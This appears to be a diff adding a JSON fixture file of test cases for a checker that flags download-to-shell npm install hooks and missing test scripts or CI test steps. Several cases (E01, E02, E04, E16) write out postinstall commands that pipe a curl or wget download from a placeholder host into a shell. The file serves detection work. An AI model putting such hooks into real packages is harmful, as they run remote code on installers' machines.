@@ -1,0 +1,148 @@
+[
+  {
+    "id": "E01",
+    "rule": "INSTALL-01",
+    "label": "Literal curl pipeline",
+    "scripts": { "postinstall": "curl -fsSL https://example.invalid/bootstrap | sh" },
+    "expected": "match",
+    "reason": "Direct supported download-to-shell syntax."
+  },
+  {
+    "id": "E02",
+    "rule": "INSTALL-01",
+    "label": "Literal wget pipeline",
+    "scripts": { "prepare": "wget -qO- https://example.invalid/bootstrap | bash -s" },
+    "expected": "match",
+    "reason": "Second documented downloader and shell."
+  },
+  {
+    "id": "E03",
+    "rule": "INSTALL-01",
+    "label": "Ordinary lifecycle script",
+    "scripts": { "install": "node setup.js" },
+    "expected": "no_match",
+    "reason": "Lifecycle presence alone is not the specified condition."
+  },
+  {
+    "id": "E04",
+    "rule": "INSTALL-01",
+    "label": "Quoted example in echo",
+    "scripts": { "postinstall": "echo \"curl https://example.invalid/x | sh\"" },
+    "expected": "no_match",
+    "reason": "Displayed text is not a direct download pipeline."
+  },
+  {
+    "id": "E05",
+    "rule": "INSTALL-01",
+    "label": "Non-string hook",
+    "scripts": { "install": 42 },
+    "expected": "inconclusive",
+    "reason": "The manifest cannot be assessed as a valid command."
+  },
+  {
+    "id": "E06",
+    "rule": "TEST-01",
+    "label": "Missing test key",
+    "scripts": { "build": "vite build" },
+    "expected": "match",
+    "reason": "No root npm test entry point."
+  },
+  {
+    "id": "E07",
+    "rule": "TEST-01",
+    "label": "Empty test command",
+    "scripts": { "test": "  " },
+    "expected": "match",
+    "reason": "Whitespace does not define an entry point."
+  },
+  {
+    "id": "E08",
+    "rule": "TEST-01",
+    "label": "Exact placeholder",
+    "scripts": { "test": "echo \"Error: no test specified\" && exit 1" },
+    "expected": "match",
+    "reason": "Documented npm placeholder."
+  },
+  {
+    "id": "E09",
+    "rule": "TEST-01",
+    "label": "Custom test entry point",
+    "scripts": { "test": "node custom-test-runner.js" },
+    "expected": "no_match",
+    "reason": "A command exists; behavior remains unverified."
+  },
+  {
+    "id": "E10",
+    "rule": "TEST-01",
+    "label": "Null test value",
+    "scripts": { "test": null },
+    "expected": "inconclusive",
+    "reason": "An invalid script value is not an absent key."
+  },
+  {
+    "id": "E11",
+    "rule": "CI-01",
+    "label": "Only builds",
+    "workflow": "jobs:\n  build:\n    steps:\n      - run: npm run build\n",
+    "expected": "match",
+    "reason": "No supported direct test invocation."
+  },
+  {
+    "id": "E12",
+    "rule": "CI-01",
+    "label": "Direct npm run test",
+    "workflow": "jobs:\n  verify:\n    steps:\n      - run: npm run test\n",
+    "expected": "no_match",
+    "reason": "A supported direct command is declared."
+  },
+  {
+    "id": "E13",
+    "rule": "CI-01",
+    "label": "Name is not execution",
+    "workflow": "name: npm test\njobs:\n  test:\n    steps:\n      - run: echo npm test\n",
+    "expected": "match",
+    "reason": "Names and displayed text do not invoke npm test."
+  },
+  {
+    "id": "E14",
+    "rule": "CI-01",
+    "label": "Reusable workflow",
+    "workflow": "jobs:\n  verify:\n    uses: example/ci/.github/workflows/tests.yml@main\n",
+    "expected": "inconclusive",
+    "reason": "Delegated workflow is not inspected."
+  },
+  {
+    "id": "E15",
+    "rule": "CI-01",
+    "label": "Incomplete inventory",
+    "incomplete": true,
+    "expected": "inconclusive",
+    "reason": "Missing inventory cannot support a gap claim."
+  },
+  {
+    "id": "E16",
+    "rule": "INSTALL-01",
+    "label": "Quoted download URL outside supported syntax",
+    "scripts": { "postinstall": "curl \"https://example.invalid/bootstrap\" | sh" },
+    "expected": "no_match",
+    "outsideScope": true,
+    "reason": "Known broader-pattern miss: quoted arguments are excluded from the initial syntax."
+  },
+  {
+    "id": "E17",
+    "rule": "CI-01",
+    "label": "Custom npm script name",
+    "workflow": "jobs:\n  verify:\n    steps:\n      - run: npm run unit\n",
+    "expected": "inconclusive",
+    "outsideScope": true,
+    "reason": "Script-name resolution is outside the initial direct-command contract."
+  },
+  {
+    "id": "E18",
+    "rule": "CI-01",
+    "label": "No workflow files",
+    "noWorkflows": true,
+    "expected": "match",
+    "reason": "A complete inventory contains no recognized GitHub Actions workflow."
+  }
+]
